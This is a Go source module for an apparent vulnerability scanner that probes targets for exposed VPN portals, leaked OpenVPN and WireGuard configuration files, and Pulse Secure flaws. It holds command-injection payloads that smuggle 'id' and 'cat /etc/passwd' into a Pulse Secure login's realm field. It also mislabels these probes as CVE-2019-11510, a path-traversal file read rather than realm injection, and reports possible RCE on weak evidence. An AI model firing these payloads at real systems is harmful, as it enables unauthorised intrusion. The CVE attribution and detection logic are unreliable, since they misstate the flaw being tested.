package vpn

import (
	"context"
	"fmt"
	"strings"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type VPNModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *VPNModule) ID() string   { return "vpn" }
func (m *VPNModule) Name() string { return "VPN Endpoint Scanner" }
func (m *VPNModule) Description() string {
	return "Detects exposed VPN interfaces, Pulse Secure RCE patterns, leaked config files, and login portals for SSL VPN, OpenVPN, and WireGuard"
}
func (m *VPNModule) Severity() models.Severity { return models.Critical }

func (m *VPNModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *VPNModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	baseURL := strings.TrimRight(target.URL, "/")

	vpnEndpoints := []struct {
		path        string
		name        string
		description string
		vendor      string
	}{
		{"/sslvpn", "SSL VPN", "Generic SSL VPN portal", "Generic"},
		{"/vpn", "VPN Portal", "Generic VPN portal", "Generic"},
		{"/remote", "Remote Access Portal", "Generic remote access portal", "Generic"},
		{"/remote/login", "Remote Access Login", "Remote access login page", "Generic"},
		{"/dana-na/", "Pulse Secure Login", "Pulse Secure SSL VPN login interface", "Pulse Secure"},
		{"/dana-na/auth/url_default/login.cgi", "Pulse Secure Login CGI", "Pulse Secure VPN login handler", "Pulse Secure"},
		{"/dana-na/nc/nc_gina.cgi", "Pulse Secure NC", "Pulse Secure Network Connect handler", "Pulse Secure"},
		{"/dana-na/nc/nc_launch.cgi", "Pulse Secure NC Launch", "Pulse Secure NC launch handler", "Pulse Secure"},
		{"/saml/module.php/saml/sp/login", "Pulse Secure SAML", "Pulse Secure SAML login endpoint", "Pulse Secure"},
		{"/global-protect/login.esp", "GlobalProtect Portal", "Palo Alto GlobalProtect portal login", "Palo Alto"},
		{"/global-protect/prelogin.esp", "GlobalProtect Prelogin", "Palo Alto GlobalProtect pre-login endpoint", "Palo Alto"},
		{"/plus/login", "Sophos UTM Login", "Sophos UTM VPN login", "Sophos"},
		{"/remote_auth", "Remote Auth", "VPN remote authentication endpoint", "Generic"},
		{"/logon", "VPN Logon", "VPN logon page", "Generic"},
	}

	for _, ep := range vpnEndpoints {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		testURL := baseURL + ep.path
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 302 || resp.StatusCode == 403 {
			bodyLower := strings.ToLower(resp.Body)
			vpnIndicators := []string{
				"vpn", "ssl-vpn", "sslvpn", "secure gateway",
				"pulse secure", "juniper", "globalprotect", "panorama",
				"sign in", "sign-in", "password", "username",
				"please log in", "authentication", "token",
				"fortinet", "fortigate", "sophos", "utm",
				"openvpn", "wireguard", "cisco anyconnect",
				"secure connect", "remote access", "gateway",
				"login to", "client certificate",
			}
			matched := false
			var matchedIndicator string
			for _, ind := range vpnIndicators {
				if strings.Contains(bodyLower, ind) {
					matched = true
					matchedIndicator = ind
					break
				}
			}

			if matched {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("VPN - %s (%s)", ep.name, ep.vendor),
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Evidence:    fmt.Sprintf("Endpoint %s returned HTTP %d (matched: '%s')", ep.path, resp.StatusCode, matchedIndicator),
					Description: fmt.Sprintf("%s is publicly accessible, exposing the VPN login interface to attackers.", ep.description),
					Remediation: "Restrict VPN management/portal access by source IP. Use certificate-based auth where possible. Enable MFA and monitor for brute force attacks.",
					CWEID:       "CWE-200",
					ModuleID:    "vpn",
				})
			}
		}
	}

	pulseRCEPaths := []string{
		"/dana-na/",
		"/dana-na/nc/nc_launch.cgi",
		"/dana-na/nc/nc_gina.cgi",
		"/dana-na/auth/url_default/login.cgi",
	}
	pulsePayloads := []string{
		"dses=0&txtUsername=admin&txtPassword=admin&btnSubmit=Login&realm=#[fakename]&signed=#thisismalicious",
		"dses=0&txtUsername=admin&txtPassword=admin&btnSubmit=Login&realm=*|id|*",
		"dses=0&txtUsername=admin&txtPassword=admin&btnSubmit=Login&realm=*|cat+/etc/passwd|*",
	}

	for _, pp := range pulseRCEPaths {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		for _, payload := range pulsePayloads {
			testURL := baseURL + pp
			resp, err := m.client.DoRaw("POST", testURL, map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			}, payload)
			if err != nil {
				continue
			}

			bodyLower := strings.ToLower(resp.Body)
			if strings.Contains(bodyLower, "root:") || strings.Contains(bodyLower, "uid=") || strings.Contains(bodyLower, "/bin/bash") {
				findings = append(findings, &models.Finding{
					Title:       "VPN - Pulse Secure RCE (CVE-2019-11510)",
					Severity:    models.Critical,
					Confidence:  models.CriticalConfidence,
					URL:         testURL,
					Payload:     truncate(payload, 100),
					Evidence:    "Pulse Secure endpoint returned file content, confirming arbitrary file read / RCE",
					Description: "Pulse Secure VPN is vulnerable to arbitrary file read / pre-auth RCE (CVE-2019-11510). Attackers can read sensitive files including VPN configuration and credentials.",
					Remediation: "Update Pulse Secure to the latest patched version. Restrict VPN management interface to internal IPs only.",
					CWEID:       "CWE-200",
					ModuleID:    "vpn",
				})
				goto configLeak
			}

			if resp.StatusCode == 200 && !strings.Contains(bodyLower, "error") && !strings.Contains(bodyLower, "invalid") {
				findings = append(findings, &models.Finding{
					Title:       "VPN - Possible Pulse Secure RCE (CVE-2019-11510)",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Payload:     truncate(payload, 100),
					Evidence:    fmt.Sprintf("Pulse Secure endpoint at %s accepted malicious realm parameter without error", pp),
					Description: "Pulse Secure VPN may be vulnerable to pre-auth arbitrary file read (CVE-2019-11510). Further verification needed.",
					Remediation: "Update Pulse Secure to the latest patched version. Restrict VPN management interface to internal IPs only.",
					CWEID:       "CWE-200",
					ModuleID:    "vpn",
				})
				goto configLeak
			}
		}
	}

configLeak:
	configPaths := []string{
		"/client.ovpn", "/config.ovpn", "/vpn.ovpn", "/openvpn.ovpn",
		"/staticclient.ovpn", "/client.conf", "/config.conf",
		"/vpn-config.ovpn", "/openvpn/config.ovpn",
		"/vpn/config.ovpn", "/ovpn/config.ovpn",
		"/wireguard.conf", "/wg0.conf", "/wg.conf",
		"/etc/wireguard/wg0.conf", "/configs/wg0.conf",
	}

	for _, cp := range configPaths {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		testURL := baseURL + cp
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			bodyLower := strings.ToLower(resp.Body)

			if strings.Contains(bodyLower, "client") || strings.Contains(bodyLower, "dev tun") || strings.Contains(bodyLower, "remote ") {
				if strings.Contains(bodyLower, "-----begin certificate-----") || strings.Contains(bodyLower, "cert ") || strings.Contains(bodyLower, "key ") || strings.Contains(bodyLower, "-----begin") {
					findings = append(findings, &models.Finding{
						Title:       "VPN - OpenVPN Config File Leaked",
						Severity:    models.Critical,
						Confidence:  models.CriticalConfidence,
						URL:         testURL,
						Evidence:    fmt.Sprintf("OpenVPN configuration at %s contains embedded certificates/keys", cp),
						Description: "OpenVPN configuration file with embedded certificates is publicly accessible, allowing full VPN network access.",
						Remediation: "Remove configuration files from public directories. Use proper access controls. Rotate all exposed certificates and keys immediately.",
						CWEID:       "CWE-522",
						ModuleID:    "vpn",
					})
					goto wireguardCheck
				}

				findings = append(findings, &models.Finding{
					Title:       "VPN - OpenVPN Config File Exposed",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Evidence:    fmt.Sprintf("OpenVPN configuration file accessible at %s", cp),
					Description: "OpenVPN configuration file is publicly exposed, revealing VPN server addresses, routing, and protocol details.",
					Remediation: "Remove configuration files from public directories. Restrict access with authentication.",
					CWEID:       "CWE-200",
					ModuleID:    "vpn",
				})
				goto wireguardCheck
			}

			if strings.Contains(bodyLower, "[interface]") || strings.Contains(bodyLower, "privatekey") || strings.Contains(bodyLower, "listenport") || strings.Contains(bodyLower, "endpoint") {
				findings = append(findings, &models.Finding{
					Title:       "VPN - WireGuard Config File Leaked",
					Severity:    models.Critical,
					Confidence:  models.CriticalConfidence,
					URL:         testURL,
					Evidence:    fmt.Sprintf("WireGuard configuration at %s contains private keys and peer information", cp),
					Description: "WireGuard configuration file with private keys is publicly accessible, allowing full VPN network access.",
					Remediation: "Remove configuration files from public directories. Rotate all exposed WireGuard private keys immediately.",
					CWEID:       "CWE-522",
					ModuleID:    "vpn",
				})
				goto wireguardCheck
			}
		}
	}

wireguardCheck:
	wgPaths := []string{"/wireguard", "/wg", "/vpn/wireguard", "/wireguard/", "/wg/"}
	for _, wp := range wgPaths {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		testURL := baseURL + wp
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			bodyLower := strings.ToLower(resp.Body)
			wgIndicators := []string{
				"wireguard", "wg-quick", "interface", "privatekey",
				"publickey", "listenport", "endpoint", "allowedips",
				"wireguard tunnel", "handshake",
			}
			matched := false
			for _, ind := range wgIndicators {
				if strings.Contains(bodyLower, ind) {
					matched = true
					break
				}
			}

			if matched {
				findings = append(findings, &models.Finding{
					Title:       "VPN - WireGuard Endpoint Exposed",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Evidence:    fmt.Sprintf("WireGuard management/info at %s returned HTTP 200", wp),
					Description: "WireGuard VPN endpoint configuration or status page is publicly accessible.",
					Remediation: "Restrict WireGuard management endpoints to internal networks. Use firewall rules to limit access.",
					CWEID:       "CWE-200",
					ModuleID:    "vpn",
				})
			}
		}
	}

	sslVPNDetectionPaths := []string{
		"/remote", "/remote/login", "/sslvpn", "/dana-na/",
		"/global-protect/prelogin.esp", "/plus/login",
	}

	for _, sp := range sslVPNDetectionPaths {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		testURL := baseURL + sp
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			bodyLower := strings.ToLower(resp.Body)
			sslIndicators := []string{
				"ssl-vpn", "sslvpn", "ssl vpn", "secure socket layer",
				"vpn portal", "please login", "webvpn", "web-vpn",
				"anyconnect", "secure gateway", "browser-based vpn",
			}
			for _, ind := range sslIndicators {
				if strings.Contains(bodyLower, ind) {
					findings = append(findings, &models.Finding{
						Title:       "VPN - SSL VPN Login Page Exposed",
						Severity:    models.High,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Evidence:    fmt.Sprintf("SSL VPN login page at %s (matched: '%s')", sp, ind),
						Description: "SSL VPN login page is publicly accessible, exposing the VPN portal to credential attacks.",
						Remediation: "Use certificate-based VPN authentication. Restrict VPN portal with IP whitelisting. Enable MFA and brute force protection.",
						CWEID:       "CWE-522",
						ModuleID:    "vpn",
					})
					break
				}
			}
		}
	}

	return findings, nil
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func init() {
	engine.GetRegistry().Register(&VPNModule{})
}
